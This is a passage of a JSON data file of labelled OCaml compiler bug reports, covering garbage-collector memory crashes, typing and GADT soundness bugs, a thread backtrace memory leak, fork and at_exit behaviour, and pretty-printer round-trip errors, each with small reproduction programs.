350Mb; no crash until round 140.\r\n\r\nLinux 64-bit:\r\n trunk : memory usage oscillating between 600Mb and 1Gb, but no failure until round 35.\r\n 4.02  : memory usage oscillating between 500Mb and 1Gb, but no failure until round 140.\r\n\r\n\r\nAnother example:\r\n\r\n<pre>\r\nlet () =\r\n  let l = ref [] in\r\n  for k = 1 to 1000 do\r\n    Printf.printf \"=======================\\nROUND %d\\n%!\" k;\r\n    l := [];\r\n    for i = 1 to 10000000 do\r\n      l := Bytes.create 20 :: !l\r\n    done\r\n  done\r\n</pre>\r\n\r\nTests:\r\n\r\nMSVC 32-bit:\r\n trunk : crash after 5 rounds.\r\n 4.02  : memory usage oscillating between 200Mb and 550Mb; no .\r\n\r\n\r\nBoth native and bytecode are affected.\r\n\r\nWith the last example, here is the output of the test with OCAMLRUNPAM=v=1:\r\n\r\n<pre>\r\n$ OCAMLRUNPARAM=v=1 ./eatmem.exe\r\n=======================\r\nROUND 1\r\nStarting new major GC cycle\r\nStarting new major GC cycle\r\nStarting new major GC cycle\r\nStarting new major GC cycle\r\nStarting new major GC cycle\r\nStarting new major GC cycle\r\nStarting new major GC cycle\r\nStarting new major GC cycle\r\nStarting new major GC cycle\r\nStarting new major GC cycle\r\n=======================\r\nROUND 2\r\n=======================\r\nROUND 3\r\n=======================\r\nROUND 4\r\n=======================\r\nROUND 5\r\nFatal error: out of memory.\r\n</pre>\r\n\r\nSetting OCAMLRUNPARAM=o=50 only delays the problem (crash at round 26).\r\n\r\nAdding a call to Gc.major before the inner loop avoids the crash.\r\n\r\n\r\nWith OCAMLRUNPARAM=v=64 and grepping for \"computed work\", I observe that with 4.02, this amount remains around 1474537, while with 4.03, it oscillates a lot.  Here is output of this grep piped to \"uniq -c\":\r\n\r\n<pre>\r\n      1 computed work = 128574 words\r\n      1 computed work = 284671 words\r\n      1 computed work = 433664 words\r\n      1 computed work = 574463 words\r\n      1 computed work = 550947 words\r\n      1 computed work = 728868 words\r\n      1 computed work = 838521 words\r\n      1 computed work = 1157120 words\r\n      2 computed work = 1330687 words\r\n      1 computed work = 1228898 words\r\n      2 computed work = 1228883 words\r\n      4 computed work = 1474537 words\r\n      3 computed work = 1228848 words\r\n      1 computed work = 1228839 words\r\n      5 computed work = 1474537 words\r\n      1 computed work = 1228831 words\r\n      4 computed work = 1228825 words\r\n      1 computed work = 1228819 words\r\n      8 computed work = 1474537 words\r\n      1 computed work = 1228814 words\r\n      6 computed work = 1228810 words\r\n      2 computed work = 1228806 words\r\n     11 computed work = 1474537 words\r\n      2 computed work = 1228803 words\r\n      9 computed work = 108938 words\r\n     11 computed work = 255035 words\r\n     13 computed work = 382057 words\r\n     10 computed work = 492524 words\r\n     24 computed work = 1474537 words\r\n     15 computed work = 115340 words\r\n     22 computed work = 260583 words\r\n     25 computed work = 386874 words\r\n     28 computed work = 130639 words\r\n     33 computed work = 273877 words\r\n     35 computed work = 121659 words\r\n     65 computed work = 1474537 words\r\n      1 computed work = 4 words\r\n      1 computed work = 182366 words\r\n     27 computed work = 182364 words\r\n      1 computed work = 695 words\r\n      1 computed work = 181672 words\r\n      3 computed work = 182364 words\r\n     58 computed work = 136869 words\r\n     66 computed work = 121051 words\r\n     76 computed work = 127938 words\r\n     88 computed work = 32216 words\r\n     88 computed work = 84244 words\r\n      1 computed work = 321 words\r\n      1 computed work = 83928 words\r\n      1 computed work = 84241 words\r\n     11 computed work = 84244 words\r\n    116 computed work = 52577 words\r\n    134 computed work = 48643 words\r\n    118 computed work = 65748 words\r\n      1 computed work = 250 words\r\n      1 computed work = 65501 words\r\n      1 computed work = 65746 words\r\n     33 computed work = 65748 words\r\n    177 computed work = 38979 words\r\n    169 computed work = 38981 words\r\n      1 computed work = 148 words\r\n      1 computed work = 38834 words\r\n      1 computed work = 38979 words\r\n     32 computed work = 38981 words\r\n</pre>\r\n\r\nIt seems that when the heap reaches a certain size, the GC reduces too much the amount of work to do in each slide.\r\n"},{"labels":["bug"],"text":"**Original bug ID:** 7227\n**Reporter:** RichN\n**Status:** resolved (set by @xavierleroy on 2017-02-16T08:15:36Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** minor\n**Platform:** ARMv6-hf\n**OS:** NetBSD\n**OS Version:** 7.0\n**Category:** ~DO NOT USE (was: OCaml general)\n**Tags:** arm\n\n## Bug description\n\nBack in November, I contributed patches to get the compiler to build and work on a RaspberryPi running NetBSD 7.0. It passed all the tests. Recently, I built the compiler again, but this time specifying \"-flambda\". One test fails:\r\n\r\nRunning tests from 'tests/float-unboxing' ...\r\n ... testing with ocamlc ocamlopt Fatal error: exception Failure(\"float and int64 record; alloc = 56000\")\r\n => failed\r\n\r\nI'm building the sources from commit 7924ec57074c127a7dffb79391eea9bc514491e1 (from GitHub.) Building the compiler suite on the RaspberryPi takes a long time, so if anyone has an educated guess as to where to try to rebuild (using a git commit hash) I won't mind rebuilding from that point and reporting the results.\n\n## Steps to reproduce\n\nRun the tests after building the compiler suite.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7226\n**Reporter:** antron\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:57Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** back end (clambda to assembly)\n**Monitored by:** @gasche @mmottl\n\n## Bug description\n\nLLVM's assembler does not (apparently) accept negative column numbers, e.g.\r\n\r\n.loc 2 1 -1\r\n\r\nThe result is that it is not possible to compile on systems that use Clang for assembly, with the -g flag, with a PPX that sometimes uses Location.none, because Location.none has a column number of -1:\r\n\r\n  /var/folders/wr/52wphbkn0zx5nvbx61v640nm0000gn/T/camlasmef96b3.s:2804:11: error: unexpected token in '.loc' directive\r\n   .loc 2 1 -1\r\n          ^\n\n## Steps to reproduce\n\n1. To check for such an assembler:\r\n\r\nfoo.s:\r\n\r\n.file 1 \"_none_\"\r\n.loc 1 1 -1\r\n\r\n\r\nThen:\r\n\r\nclang foo.s\r\nas foo.s       # If this is gas, it should accept the -1.\r\n\r\n\r\n2. To trigger this failure through OCaml:\r\n\r\nppx_loc_bug.ml:\r\n\r\n(* Changes location of all application expressions to Location.none. *)\r\n\r\nopen Asttypes\r\nopen Parsetree\r\nopen Ast_mapper\r\n\r\nlet mapper _ =\r\n  {default_mapper with expr = fun mapper e ->\r\n    match e with\r\n    | {pexp_desc = Pexp_apply _} -> {e with pexp_loc = Location.none}\r\n    | _ -> default_mapper.expr mapper e}\r\n\r\nlet () =\r\n  register \"ppx_loc_bug\" mapper\r\n\r\n\r\ntest.ml:\r\n\r\nlet () =\r\n  print_endline \"Hello world!\"\r\n\r\n\r\nMakefile:\r\n\r\nPPX = ppx_loc_bug\r\nTEST = test\r\n\r\n.PHONY : build\r\nbuild : clean\r\n\tocamlfind opt -linkpkg -package compiler-libs.common -o $(PPX) $(PPX).ml\r\n\r\n\t@echo \"  No Location.none: expected to succeed\"\r\n\tocamlfind opt -g -o $(TEST) $(TEST).ml\r\n\r\n\t@echo \"  No -g: expected to succeed\"\r\n\tocamlfind opt -ppx ./$(PPX) -o $(TEST) $(TEST).ml\r\n\r\n\t@echo \"  Location.none + -g: expected to fail on 4.03.0+beta2\"\r\n\tocamlfind opt -ppx ./$(PPX) -g -o $(TEST) $(TEST).ml\r\n\r\n.PHONY : clean\r\nclean :\r\n\trm -f $(PPX) $(TEST) *.cm[iox] *.o\n\n## Additional information\n\nThis was apparently introduced by https://github.com/ocaml/ocaml/pull/212\r\n\r\nI propose to solve it by not emitting the column number if it is negative, i.e.\r\n\r\n.loc 2 1\r\n\r\n\r\nIf this is reasonable, I can make a PR.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7223\n**Reporter:** @let-def\n**Status:** acknowledged (set by @damiendoligez on 2016-04-14T15:35:20Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Category:** misc\n**Related to:** #4148\n**Monitored by:** @hcarty\n\n## Bug description\n\nThe issue is two fold:\r\n\r\nFirst, the -pack option of the compiler seems to accept cmi files (interface only) as input.\r\nThere is extensive code in the compiler to support this (PM_intf in */*packager.ml files), so I guess this is a desired feature.\r\nHowever I couldn't find corresponding documentation or specification, so I am unsure what the intended behavior is. Could this be clarified in the manual?\r\n\r\nFinally, an inconsistent behavior appears between native and bytecode backends when mixing module aliases and packed interfaces.\r\nPacking a CMI and referring to it via a module alias `module A = My_packed_intf` in another packed module fails in bytecode but succeeds in native.\n\n## Steps to reproduce\n\nLaunching make with the three files provided triggers the issue.\r\nA and B are setup as described above and the Makefile packs both with a bytecode and a native target.\r\n\r\nExpected output:\r\n\r\n$ make\r\nocamlopt -for-pack Fail -c a.mli\r\nocamlopt -for-pack Fail -c b.ml\r\nocamlopt -pack -o fail.cmx a.cmi b.cmx\r\nocamlc -for-pack Fail -c a.mli\r\nocamlc -for-pack Fail -c b.ml\r\nocamlc -pack -o fail.cmo a.cmi b.cmo\r\nFile \"_none_\", line 1:\r\nError: Forward reference to A in file b.cmo\r\nMakefile:9: recipe for target 'byte' failed\r\nmake: *** [byte] Error 2\n\n## Additional information\n\nAlso fails on 4.03.0+beta2\n\n## File attachments\n\n- [reproduce.tar](https://gist.githubusercontent.com/vicuna/bab81eb17b176584f3923794f8b2813c/raw/7dccf4411ee8300a23ed0b1e6cb0921ef320a0fa/reproduce.tar)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7222\n**Reporter:** @Octachron\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:19Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.02.3\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** typing\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nThe following code leads to a toplevel function with existential type within its type:\r\n\"\r\ntype +'a n = private int \r\ntype nil = private Nil_type\r\ntype (_,_) elt =\r\n  | Elt_fine: 'nat n -> ('l,'nat * 'l) elt\r\n  | Elt: 'nat n -> ('l,'nat -> 'l) elt\r\ntype _ t = Nil : nil t | Cons : ('x, 'fx) elt * 'x t -> 'fx t\r\n\r\nlet undetected:  ('a -> 'b -> nil) t -> 'a n -> 'b n -> unit = fun sh i j ->\r\n  let Cons(Elt dim, _) = sh in ()\r\n\"\r\nThe type inferred for \"undetected\" is \"('a -> $'b -> nil) t -> 'a n -> $'b n -> unit \".\r\n\r\nAs far as I understand, the existential type \"$'b\" should never appear in the type of a toplevel function and this is a typing error.\r\n\r\nMoreover, slightly altering the code to\r\n\r\n\"\r\nlet detected:  ('a * 'b * nil) t -> 'a n -> 'b n -> unit = fun sh i j ->\r\n  let Cons(Elt_fine dim, _) = sh in ()\r\n\"\r\ntriggers a compiler error about the existential type leaving its scope.\r\nThe same problem persists from version 4.02.3 to the beta2 version of 4.03.0.\r\n\r\nAs a supplementary information, calling the full version of this function accross module boundary triggered an internal assertion failure at (File \"typing/typecore.ml\", line 1903, characters 65-71) within the 4.02.3 compiler.\r\nUnfortunately, I could not try the original code with the 4.03 beta compilers.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7220\n**Reporter:** robhoes\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:22Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** amd64\n**OS:** Linux, Mac OS X\n**Version:** 4.02.3\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** runtime system and C interface\n**Related to:** #4702 #5188\n**Monitored by:** lindig braibant @hcarty @dbuenzli\n\n## Bug description\n\nAn OCaml program with backtrace recording enabled leaks memory each time a new thread is created and completes.\n\n## Steps to reproduce\n\nThe following example program, compiled with the `-g` option, will very quickly eat up all your memory:\r\n\r\nlet _ =\r\n Printexc.record_backtrace true;\r\n let rec loop () =\r\n   let t = Thread.create (fun () ->\r\n     try\r\n       raise Not_found\r\n     with Not_found ->\r\n       ()\r\n   ) () in\r\n   Thread.join t;\r\n   loop ()\r\n in\r\n loop ()\n\n## Additional information\n\nIâve tried this on various compilers (4.02.3, 4.01.0 and 3.12.1), on Linux and Mac, native and bytecode, and see the problem on all of them.\r\n\r\nValgrind reports that the allocation of `caml_backtrace_buffer` in the function `caml_stash_backtrace` in asmrun/backtrace_prim.c is the culprit (https://github.com/ocaml/ocaml/blob/trunk/asmrun/backtrace_prim.c#L98):\r\n\r\n if (caml_backtrace_buffer == NULL) {\r\n   Assert(caml_backtrace_pos == 0);\r\n   caml_backtrace_buffer = malloc(BACKTRACE_BUFFER_SIZE\r\n                                  * sizeof(backtrace_slot));\r\n   if (caml_backtrace_buffer == NULL) return;\r\n }\r\n\r\nThe `caml_backtrace_buffer` variable is a global variable initialised to NULL in byterun/backtrace.c. However, it seems to be local to a thread (how does it become thread local?), is set to NULL whenever a thread is created (where?), and a new malloc happens when an exception is raised. It is not freed when the thread completes.\n\n## File attachments\n\n- [PR7220-fix-backtrace-memory-leak-in-systhreads.patch](https://gist.githubusercontent.com/vicuna/d41e6b14a263d7de2bec040fdc9a07fe/raw/5a9ebdc41ff6b096dea95f71503465379a62cc04/PR7220-fix-backtrace-memory-leak-in-systhreads.patch)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7217\n**Reporter:** furuse\n**Assigned to:** @damiendoligez\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:17Z)\n**Resolution:** fixed\n**Priority:** urgent\n**Severity:** block\n**Platform:** MinGW OCaml\n**Version:** 4.02.3\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** otherlibs\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nThe following code succeeds w/o creating a symlink, in MinGW OCaml 4.03.0+beta2 w/o Admin right:\r\n\r\nlet () =\r\n  Printf.printf \"has_symlink=%b\\n\" @@ Unix.has_symlink ();  (* says false *)\r\n  let oc = open_out \"z\" in\r\n  output_string oc \"hello\";\r\n  close_out oc;\r\n  Unix.symlink \"z\" \"zz\";  (* succeeds but no symlink is created *)\r\n  print_endline \"done\"\r\n\r\nThe function must raise an exception at failure!\n"},{"labels":["bug"],"text":"**Original bug ID:** 7216\n**Reporter:** @sliquister\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-12-13T08:25:19Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @diml @hcarty\n\n## Bug description\n\n# include A(val x);;\r\nError: Syntax error\r\n# include A((val x));;\r\nError: Unbound value x\n\n## File attachments\n\n- [paren_module_expr.diff](https://gist.githubusercontent.com/vicuna/7bbbfb9fc91f23d97b514fc32c70a677/raw/16f119891de762c4a49027e89ae6c79c6a7cecbc/paren_module_expr.diff)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7215\n**Reporter:** @stedolan\n**Assigned to:** @yallop\n**Status:** resolved (set by @yallop on 2017-09-25T14:14:16Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.03.0+dev / +beta1\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Related to:** #6738 #7231\n**Monitored by:** braibant @gasche @diml\n\n## Bug description\n\nThe following program segfaults, on at least 4.02.1, 4.03.0+beta1 and trunk:\r\n\r\ntype (_,_) eq = Refl : ('a, 'a) eq\r\nlet cast (type a) (type b) (Refl : (a, b) eq) (x : a) = (x : b)\r\n\r\nlet is_int (type a) =\r\n  let rec (p : (int, a) eq) = match p with Refl -> Refl in\r\n  p\r\n\r\nlet bang = print_string (cast (is_int : (int, string) eq) 42)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7214\n**Reporter:** @stedolan\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:14Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** typing\n**Monitored by:** braibant @gasche @yallop @hcarty\n\n## Bug description\n\nThe following program causes an assertion in Env.add_gadt_instance to fail:\r\n\r\ntype _ t = I : int t\r\n\r\nlet f (type a) (x : a t) =\r\n  let module M = struct\r\n    let (I : a t) = x\r\n    let x = (I : a t)\r\n  end in\r\n  ()\r\n\r\nTested on recent trunk and 4.03+beta1.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7213\n**Reporter:** @yallop\n**Status:** acknowledged (set by @gasche on 2016-04-05T14:43:15Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Target version:** later\n**Category:** lexing and parsing\n**Monitored by:** @gasche @diml @hcarty\n\n## Bug description\n\nThe following should be rejected, for consistency with the expression syntax:\r\n\r\n    function `A `B `C -> ()\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7211\n**Reporter:** pcouderc\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2016-11-12T15:23:57Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** typing\n**Duplicate of:** #6608\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nWhen copying a record and redefining all the fields, the compiler gives the following warning:\r\nWarning 23: all the fields are explicitly listed in this record:\r\nthe 'with' clause is useless.\r\n\r\nFor example:\r\n# type t = { v : int };;\r\ntype t = { v : int; }\r\n\r\n# let x = { v = 0 };;\r\nval x : t = {v = 0}\r\n\r\n# let y = {x with  v = 1 };;\r\nWarning 23: all the fields are explicitly listed in this record:\r\nthe 'with' clause is useless.\r\nval y : t = {v = 1}\r\n\r\nSurprisingly, the following value is accepted:\r\n# let z = { \"What?\" with v = 2 };;\r\nWarning 23: all the fields are explicitly listed in this record:\r\nthe 'with' clause is useless.\r\nval z : t = {v = 2}\r\n\r\nIt is surprising, but it is possible thanks to the fields disambiguation. It will not break programs since the string will not be accessed.\r\nHowever, the following program is not accepted:\r\n# type t' = { u : int };;\r\ntype t' = { u : int; }\r\n# let x' = { u = 0 };;\r\nval x' : t' = {u = 0}\r\n# let y' = { x' with v = 2 };;\r\nError: This record expression is expected to have type t'\r\n       The field v does not belong to type t'\r\n\r\nA record of another type is not accepted as the unused copy, even if this copied record will not be accessed.\r\n\r\nFinally, one can write the following function:\r\n# let f x = { x with v = 42 };;\r\nWarning 23: all the fields are explicitly listed in this record:\r\nthe 'with' clause is useless.\r\nval f : 'a -> t = <fun>\r\n\r\nIt will be polymorphic, so it will accept any other record type as argument.\r\nOn a \"theoretic\" point of view, it breaks the subject reduction I guess, but it will not actually break programs since the \"copied record\" is never accessed for the copy.\r\n\r\nHowever, one problem is that it can break APIs of modules that does not have an explicit signature: if the previous function is exported, it can be used polymorphically and becomes monomorphic if the record is extended with new fields. If the user of the module use it with any argument with a different type than the record, his code will not typecheck anymore.\n\n## Additional information\n\nWorks since 4.00.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7209\n**Reporter:** lcorrenson\n**Assigned to:** @diml\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:12Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** standard library\n**Monitored by:** bobot @dbuenzli\n\n## Bug description\n\nOriginally, we discover the Â« bug Â» when creating a process with a non-existing command :\r\n - Pervasive.at_exit some job\r\n - Unix.create_process with a wrong command\r\n - The job is executed twice\r\n\r\nDiagnosis : Unix.create_process forks the original process, which is an ocaml runtime with Pervasive.at_exit registered job(s). Then, Unix.create_process fails without cleaning the duplicated runtime, hence the job is executed in both processes. When Unix.create_process succeed, the registered jobs are executed once as expected.\r\n\r\nLess surprising, the Â« bug Â» is also visible when using Unix.fork -- is it a bug or a feature ?\r\nA work around is to check within jobs registered via Pervasives.at_exit whether the pid has changed or not.\r\nThough, we would suggest that any forking operation in the standard library starts by cleaning the daemons in the child processes.\n\n## Steps to reproduce\n\nSee attached files proc.ml and fork.ml :\r\n\r\n$ ocamlbuild -package unix proc.native && ./proc.native ocamlc   # Existing process (normal behavior)\r\n$ ocamlbuild -package unix proc.native && ./proc.native wrong    # Wrong process (unexpected)\r\n$ ocamlbuild -package unix fork.native && ./fork.native                 # Fork case (non intuitive)\n\n## Additional information\n\nAs a work-around, we simply use:\r\n\r\nlet mypid = Unix.getpid ()\r\nlet at_exit f = Persasives.at_exit\r\n   (fun () -> if Unix.getpid () = mypid then f ())\n\n## File attachments\n\n- [bug.zip](https://gist.githubusercontent.com/vicuna/dd4f7b2b7de767b66412fc749e34f930/raw/cada01501e873f859ddde4780ef97398813ceb26/bug.zip)\n- [fork.ml](https://gist.githubusercontent.com/vicuna/dd4f7b2b7de767b66412fc749e34f930/raw/9e2814c5fb51ca5348cfab4c55fddfb937b2f2a4/fork.ml)\n- [proc.ml](https://gist.githubusercontent.com/vicuna/dd4f7b2b7de767b66412fc749e34f930/raw/b06e718b4050d7263f0686780a0138813ff9f494/proc.ml)\n"},{"labels":["bug"],"text":"**Original bug ID:** 7208\n**Reporter:** furuse\n**Assigned to:** @alainfrisch\n**Status:** closed (set by @alainfrisch on 2016-04-04T07:11:17Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** major\n**Target version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @hcarty\n\n## Bug description\n\nWith 4.03.0+beta2, I got \r\n\r\n  Error: broken invariant in parsetree: Functor application now allowed here.\r\n\r\nwith PPX output contains [@attr F(A)].\r\n\r\nI know F(A) is not a valid OCaml expression, but it is parsable by parser.mly and is not rejected when it is not in the PPX output but in a source file.\r\n\r\nI feel the invariant check for F(A) is too tight here.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7207\n**Reporter:** @stedolan\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:12Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** typing\n**Monitored by:** @gasche\n\n## Bug description\n\nIf I write the following incorrect program:\r\n\r\n    module F (X : sig end) = struct type t = int end\r\n    type t = F(Does_not_exist).t\r\n\r\nthen 4.02.1 gives me a sensible error message:\r\n\r\n    File \"moderror.ml\", line 2, characters 9-28:\r\n    Error: Unbound module Does_not_exist\r\n\r\nbut 4.03+beta1 and trunk do not:\r\n\r\n    Cannot find file /home/stephen/coding/moderror.ml.\r\n\r\nRunning ocamlc -i crashes with Not_found.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7205\n**Reporter:** william\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-02-24T14:57:37Z)\n**Resolution:** suspended\n**Priority:** normal\n**Severity:** tweak\n**Platform:** linux\n**OS:** debian\n**OS Version:** 8\n**Version:** 4.02.3\n**Target version:** undecided\n**Category:** documentation\n\n## Bug description\n\nHello,\r\nList.map works (on my platform) with a list length limit of 131033 elements. \r\n\r\n* List.map documentation should say that above this limit, there is a \"Stack Overflow\" exception (and for beginners it could be nice to indicate to use above this limit the \"List.rev_map\" function)\r\n\r\n* Or List.map documentation should refer to some other documentation parts explaining the limits of non tail recursive function, and wath is the limit of the \"Stack\"\r\n\r\n* same problem with recursive functions, it seems to be limited to 262065 calls\r\n\r\nBest regards\n\n## Steps to reproduce\n\nlet rec make_n n = if n = 0 then [] else n::(make_n (n-1));;\r\nlet test i = \r\n  let lst = make_n i in\r\n  Printf.printf \"ok\\n%!\";\r\n  List.map (fun i -> 0) lst;;\r\n\r\ntest 131033;;\r\ntest 131034;;\r\ntest 262065;; (* ok still printed *)\r\ntest 262066;; (* ok not printed any more *)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7203\n**Reporter:** braibant\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:00Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** runtime system and C interface\n**Monitored by:** @hhugo\n\n## Bug description\n\nReading section 19.4.4  Allocating blocks  of the manual, there is apparently no function to allocate an array of floating point numbers of size n. \r\n\r\nTo implement that, users must check the word-size, and perform the right caml_small(n, Double_array_tag) invocation, where n depends on the word-size and the number of values in the array. \r\n\r\nWould it be possible to add a convenience function in byterun/alloc.c?\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7202\r\n**Reporter:** @dbuenzli\r\n**Status:** confirmed (set by @damiendoligez on 2016-04-05T14:34:13Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.02.3\r\n**Category:** toplevel\r\n**Monitored by:** @hcarty @dbuenzli\r\n\r\n## Bug description\r\n\r\nThis seems right:\r\n```\r\n> cat script.ml \r\n#!/usr/bin/env ocaml\r\n\r\nlet (\r\n> ocaml script.ml > /tmp/bla\r\nFile \"script.ml\", line 4, characters 0-0:\r\nError: Syntax error: operator expected.\r\n\r\n> echo $?\r\n2\r\n```\r\nHowever if I have:\r\n```\r\n> cat script.ml\r\n#!/usr/bin/env ocaml\r\n\r\n#mod_use \"bli.ml\"\r\n\r\n> ocaml script.ml > /tmp/bla\r\n> echo $?\r\n0\r\n> cat /tmp/bla\r\nCannot find file bli.ml.\r\n```"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7201\n**Reporter:** filliatr\n**Status:** closed (set by @mshinwell on 2016-12-08T14:37:46Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.03.1+dev\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** braibant @gasche @hcarty @Yakobowski\n\n## Bug description\n\nIn file asmcomp/cmmgen.ml, in function div_int, the optimization\r\n\r\n  | (Cconst_int 0 as c1, c2) ->\r\n      Csequence(c2, c1)\r\n\r\nis wrong, since c2 could be zero, as in\r\n\r\n  0 / Random.int 1\r\n\r\nor\r\n\r\n  0 / List.hd [0]\n\n## Steps to reproduce\n\n(* compile this code with ocamlopt and run it *)\r\nlet = 0 / Random.int 1\r\n(* it does not raise Division_by_zero *)\n\n## Additional information\n\ndoes not show up in ocamlc\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7200\n**Reporter:** @alainfrisch\n**Status:** feedback (set by @damiendoligez on 2017-02-23T16:24:26Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** lexing and parsing\n**Monitored by:** runhang @diml\n\n## Bug description\n\nI'm attached a small script which parses all .ml/.mli files from its command-line (recursing into subdirectories) and for each of them does the following:\r\n\r\n  1. Parse.\r\n  2. Print with Pprintast.\r\n  3. Parse the result.\r\n  4. Compare the two parse trees after removing locations).\r\n\r\nApplying this tool to the OCaml source tree discovers multiple issues with Pprintast (cases where it produces code that cannot be parsed, and cases where it produces valid code which results in a different Parsetree).  I'm also attaching the result.  (Some files cannot be parsed at all as implementation files because they are to be interpreted by the toplevel; but we cannot always parse as the toplevel since this would reject valid files, those with multiple \";;\" in a row.)\r\n\r\nInterpretation of issues (I'll edit this list as I go through the output).\r\n\r\n - ~-1 being printed as -1, reparsed as a literal.  [FIXED]\r\n\r\n - (function x | (_ as x) -> x) being printed as (function x | _ as x -> x), invalid precedence of \"as\" vs \"|\".\r\n\r\n - type expression [>] printed as [], which is invalid. [FIXED]\r\n\r\n - \"let foo : type t'. t' = assert false\" printed as \"let foo : 't' . 't'= fun (type t') -> (assert false : t')\", but 't' is not a valid type variable (parsed as a character literal token).  Not clear what to do here.\r\n\r\n - \" type t = (::) : int -> t\" printed as \"type t = | ::: int -> t\". [FIXED, also in Printyp]\r\n\r\n - \"type t = < foo: int [@foo] >\" printed as \"type t = < foo[@foo ] :int  >\".\r\n\r\n - \"[%foo: < foo : t > ]\" printed as \"[%foo :< foo :t  >]\", cannot be parsed because \">]\" is recognized as a token.\r\n\r\n - \"type foo += private A of int\" printed as \"type foo += | A of int\"  (private is dropped).\r\n\r\n - \"let f : 'a . < .. > = assert false\" printed as \"let f : 'a . < .. >= assert false\", cannot be parsed because \">=\" is recognized as a token.\r\n\r\n - \"let module M = (functor (T : sig end) -> struct end)(struct end) in ()\"\r\nprinted as \"let module M = functor (T : sig  end) -> struct  end(struct  end) in ()\".\r\n\r\n - \"object method f : int = 42 end\" printed as \"object method f : int= 42 end\", which stores the type annotation in the Pexp_poly node. (Should we fix the Parsetree definition to rely on a Pexp_constraint for that form?).\r\n\r\n - \"class c = object inherit ((fun () -> object end) ()) end\" printed as \"class c = object inherit  (fun ()  -> object  end ()) end\".\n\n## File attachments\n\n- [checkparse.ml](https://gist.githubusercontent.com/vicuna/972556d17c8a1c5a9f2cb2c6fe7fbb17/raw/9f5ea040d812caca90ee2b1786dc0bb5ea707378/checkparse.ml)\n- [checkparse.txt](https://gist.githubusercontent.com/vicuna/972556d17c8a1c5a9f2cb2c6fe7fbb17/raw/a0caade469ef8d666da001059cf5ff1eb33a0bf4/checkparse.txt)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7199\n**Reporter:** talex\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:10Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Fixed in version:** 4.03.0+dev / 